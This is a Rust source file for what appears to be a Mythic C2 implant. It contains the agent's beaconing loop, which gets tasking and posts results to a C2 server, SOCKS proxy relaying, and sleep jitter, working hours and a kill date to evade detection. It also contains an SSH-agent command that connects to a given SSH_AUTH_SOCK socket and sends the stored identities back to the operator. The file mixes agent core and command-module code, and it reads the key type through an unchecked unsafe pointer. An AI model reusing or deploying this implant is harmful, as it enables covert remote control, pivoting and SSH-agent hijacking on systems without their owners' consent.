use crate::payloadvars;
use crate::tasking::Tasker;
use crate::profiles::Profile;
use crate::socks::{SocksMsg, SOCKS_INBOUND_QUEUE, get_socks_responses};
use chrono::prelude::{DateTime, Local, NaiveDate, NaiveDateTime, NaiveTime};
use chrono::Duration;
use rand::Rng;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::error::Error;
use base64::{Engine as _, engine::general_purpose};
use ssh2::Session;
use std::env;
use std::ffi::CStr;
use std::result::Result;

#[cfg(target_os = "linux")]
use crate::utils::linux as native;
#[cfg(target_os = "windows")]
use crate::utils::windows as native;

use crate::mythic_success;

/// Struct containing each Mythic task
#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct AgentTask {
    pub command: String,
    pub parameters: String,
    pub timestamp: f64,
    pub id: String,
}

/// Struct containing the ssh agent args from Mythic
#[derive(Debug, Deserialize)]
struct SshAgentArgs {
    list: bool,
    connect: Option<String>,
    disconnect: bool,
}

/// Response from Mythic on "get_tasking"
#[derive(Debug, Deserialize, Serialize)]
pub struct GetTaskingResponse {
    pub tasks: Vec<AgentTask>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub socks: Option<Vec<SocksMsg>>,
}

/// Fallback response structure if the main one fails
#[derive(Debug, Deserialize, Serialize)]
pub struct GetTaskingResponseFallback {
    pub tasks: Vec<AgentTask>,
}

/// Response to send back to Mythic on "post_response"
#[derive(Debug, Deserialize, Serialize)]
pub struct PostTaskingResponse {
    pub action: String,
    pub responses: Vec<serde_json::Value>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub socks: Option<Vec<SocksMsg>>,
}

/// Fallback response structure for post_response if the main one fails
#[derive(Debug, Deserialize, Serialize)]
pub struct PostTaskingResponseFallback {
    pub action: String,
    pub responses: Vec<serde_json::Value>,
}

/// Used for holding any data passed to background tasks
#[derive(Debug, Deserialize, Serialize)]
pub struct ContinuedData {
    pub task_id: String,
    pub status: String,
    pub error: Option<String>,
    pub file_id: Option<String>,
    pub total_chunks: Option<u32>,
    pub chunk_num: Option<u32>,
    pub chunk_data: Option<String>,
}

/// Shared state between threads
pub struct SharedData {
    pub sleep_interval: u64,
    pub jitter: u64,
    pub exit_agent: bool,
    pub working_start: NaiveTime,
    pub working_end: NaiveTime,
}

/// Main Agent structure
pub struct Agent {
    pub shared: SharedData,
    c2profile: Profile,
    killdate: NaiveDate,
    pub tasking: Tasker,
}

impl Agent {
    pub fn new() -> Self {
        let c2profile = Profile::new(payloadvars::payload_uuid());
        Self {
            shared: SharedData {
                jitter: payloadvars::callback_jitter(),
                sleep_interval: payloadvars::callback_interval(),
                exit_agent: false,
                working_start: payloadvars::working_start(),
                working_end: payloadvars::working_end(),
            },
            c2profile,
            tasking: Tasker::new(),
            killdate: NaiveDate::parse_from_str(&payloadvars::killdate(), "%Y-%m-%d").unwrap(),
        }
    }

    /// Initial checkin with Mythic
    pub fn make_checkin(&mut self) -> Result<(), Box<dyn Error>> {
        let json_body = native::get_checkin_info();
        self.c2profile.initial_checkin(&json_body)?;
        Ok(())
    }

    /// Request new tasking from Mythic
    pub fn get_tasking(&mut self) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
        let json_body = json!({
            "action": "get_tasking",
            "tasking_size": -1,
        })
        .to_string();

        let body = self.c2profile.send_data(&json_body)?;
        
        let response = match serde_json::from_str::<GetTaskingResponse>(&body) {
            Ok(resp) => resp,
            Err(_e) => {
                // Try fallback structure without socks field
                match serde_json::from_str::<GetTaskingResponseFallback>(&body) {
                    Ok(fallback) => GetTaskingResponse {
                        tasks: fallback.tasks,
                        socks: None,
                    },
                    Err(fallback_err) => {
                        return Err(Box::new(fallback_err));
                    }
                }
            }
        };

        let mut all_tasks: Vec<AgentTask> = Vec::new();

        // Handle SOCKS messages from Mythic - process directly instead of as tasks
        if let Some(socks_data) = response.socks {
            if !socks_data.is_empty() {
                // Send SOCKS messages directly to the SOCKS thread via the inbound queue
                if let Ok(mut queue) = SOCKS_INBOUND_QUEUE.lock() {
                    queue.extend(socks_data);
                }
            }
        }

        // Normal tasks
        all_tasks.extend(response.tasks);

        if !all_tasks.is_empty() {
            Ok(Some(all_tasks))
        } else {
            Ok(None)
        }
    }

    /// Send completed tasks + SOCKS messages back to Mythic
    pub fn send_tasking(
        &mut self,
        completed: &[serde_json::Value],
    ) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
        // Retrieve SOCKS responses from the outbound queue
        let socks_to_send = get_socks_responses();

        let body = PostTaskingResponse {
            action: "post_response".to_string(),
            responses: completed.to_owned(),
            socks: if socks_to_send.is_empty() { None } else { Some(socks_to_send) },
        };

        let req_payload = serde_json::to_string(&body)?;
        let json_response = self.c2profile.send_data(&req_payload)?;
        
        let response = match serde_json::from_str::<PostTaskingResponse>(&json_response) {
            Ok(resp) => resp,
            Err(_e) => {
                // Try fallback structure without socks field
                match serde_json::from_str::<PostTaskingResponseFallback>(&json_response) {
                    Ok(fallback) => PostTaskingResponse {
                        action: fallback.action,
                        responses: fallback.responses,
                        socks: None,
                    },
                    Err(fallback_err) => {
                        return Err(Box::new(fallback_err));
                    }
                }
            }
        };

        // Handle continued tasks
        let mut pending_tasks: Vec<AgentTask> = Vec::new();
        for resp in response.responses {
            let continued: ContinuedData = serde_json::from_value(resp)?;
            pending_tasks.push(AgentTask {
                command: "continued_task".to_string(),
                parameters: serde_json::to_string(&continued)?,
                timestamp: 0.0,
                id: continued.task_id,
            });
        }

        if !pending_tasks.is_empty() {
            Ok(Some(pending_tasks))
        } else {
            Ok(None)
        }
    }

    /// Sleep function with jitter and working hours
    pub fn sleep(&mut self) {
        let now: DateTime<Local> = std::time::SystemTime::now().into();
        let now: NaiveDateTime = now.naive_local();

        if now.date() >= self.killdate {
            self.shared.exit_agent = true;
        }

        let jitter = self.shared.jitter;
        let interval = self.shared.sleep_interval;
        let sleep_time = calculate_sleep_time(interval, jitter);
        std::thread::sleep(std::time::Duration::from_secs(sleep_time));

        // Respect working hours
        let working_start = NaiveDateTime::new(now.date(), self.shared.working_start);
        let working_end = NaiveDateTime::new(now.date(), self.shared.working_end);

        if working_end != working_start {
            let mut sleep_dur = std::time::Duration::from_secs(0);
            if now < working_start {
                let delta = Duration::seconds(
                    working_start.and_utc().timestamp() - now.and_utc().timestamp(),
                );
                sleep_dur = delta.to_std().unwrap();
            } else if now > working_end {
                let next_start = working_start.checked_add_signed(Duration::days(1)).unwrap();
                let delta = Duration::seconds(
                    next_start.and_utc().timestamp() - now.and_utc().timestamp(),
                );
                sleep_dur = delta.to_std().unwrap();
            }
            std::thread::sleep(sleep_dur);
        }
    }
}

/// Sleep time with jitter logic
pub fn calculate_sleep_time(interval: u64, jitter: u64) -> u64 {
    let jitter = (rand::thread_rng().gen_range(0..=jitter) as f64) / 100.0;
    if (rand::random::<u8>()) % 2 == 1 {
        interval + (interval as f64 * jitter) as u64
    } else {
        interval - (interval as f64 * jitter) as u64
    }
}

/// Initial function call to parse what action to take
/// * `task` - Mythic task information
pub fn ssh_agent(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    // Parse the task arguments
    let args: SshAgentArgs = serde_json::from_str(&task.parameters)?;

    // Check if the user wants to list agent identities
    let user_output = if args.list {
        agent_list(&task.id)?
    } else if let Some(ref path) = args.connect {
        // Check if the user wants to connect to an agent
        agent_connect(&task.id, path)?
    } else if args.disconnect {
        // Check if the user wants to disconnect from the ssh agent
        agent_disconnect(&task.id)?
    } else {
        mythic_success!(task.id, "Invalid arguments")
    };

    Ok(user_output)
}

/// Connects to a running SSH agent unix socket
/// * `id` - Task ID
/// * `socket` - Path to SSH socket
fn agent_connect(id: &str, socket: &str) -> Result<serde_json::Value, Box<dyn Error>> {
    // Grab the currently set SSH_AUTH_SOCK if it exists
    let orig_agent = env::var("SSH_AUTH_SOCK");

    // Set the new SSH_AUTH_SOCK path
    env::set_var("SSH_AUTH_SOCK", socket);

    // Test to see if the ssh agent can be connected to
    let sess = match Session::new() {
        Ok(s) => s,
        Err(e) => {
            // Set the SSH_AUTH_SOCK back to what it originally was if there was an error
            if let Ok(orig_socket) = orig_agent {
                env::set_var("SSH_AUTH_SOCK", orig_socket);
            } else {
                env::remove_var("SSH_AUTH_SOCK");
            }

            return Err(e.into());
        }
    };

    let mut agent = match sess.agent() {
        Ok(a) => a,
        Err(e) => {
            // Set the SSH_AUTH_SOCK back to what it originally was if there was an error
            if let Ok(orig_socket) = orig_agent {
                env::set_var("SSH_AUTH_SOCK", orig_socket);
            } else {
                env::remove_var("SSH_AUTH_SOCK");
            }

            return Err(e.into());
        }
    };

    if let Err(e) = agent.connect() {
        if let Ok(orig_socket) = orig_agent {
            env::set_var("SSH_AUTH_SOCK", orig_socket);
        } else {
            env::remove_var("SSH_AUTH_SOCK");
        }

        return Err(e.into());
    }

    // Return a successs
    Ok(mythic_success!(id, "Successfully connected to ssh agent"))
}

/// List identities in the currently connected ssh agent
/// * `id` - Task Id
fn agent_list(id: &str) -> Result<serde_json::Value, Box<dyn Error>> {
    // Check if the SSH_AUTH_SOCK variable is set
    if env::var("SSH_AUTH_SOCK").is_err() {
        return Err("Not connected to any ssh agent".into());
    }

    // Connect to the ssh agent
    let sess = Session::new()?;
    let mut agent = sess.agent()?;
    agent.connect()?;

    // List the stored identities
    agent.list_identities()?;
    let keys = agent.identities()?;

    // Check if there is at least 1 identity
    let user_output = if !keys.is_empty() {
        let mut tmp = String::new();

        // Loop over each identity extracting the public key and comment
        for key in keys {
            let raw_blob = key.blob();
            let key_type = unsafe { CStr::from_ptr(raw_blob[4..].as_ptr() as *const i8) };
            let b64_blob = general_purpose::STANDARD.encode(raw_blob);

            tmp.push_str(
                format!(
                    "Key type: {}\nbase64 blob: {}\nComment: {}\n\n",
                    key_type.to_str()?,
                    b64_blob,
                    key.comment()
                )
                .as_str(),
            );
        }
        tmp
    } else {
        "No identities in ssh agent".to_string()
    };

    // Send the output to Mythic
    Ok(mythic_success!(id, user_output))
}

/// Disconnect from the currently connected ssh agent
/// * `id` - Task Id
fn agent_disconnect(id: &str) -> Result<serde_json::Value, Box<dyn Error>> {
    env::remove_var("SSH_AUTH_SOCK");
    Ok(mythic_success!(id, "Disconnected from ssh agent"))
}
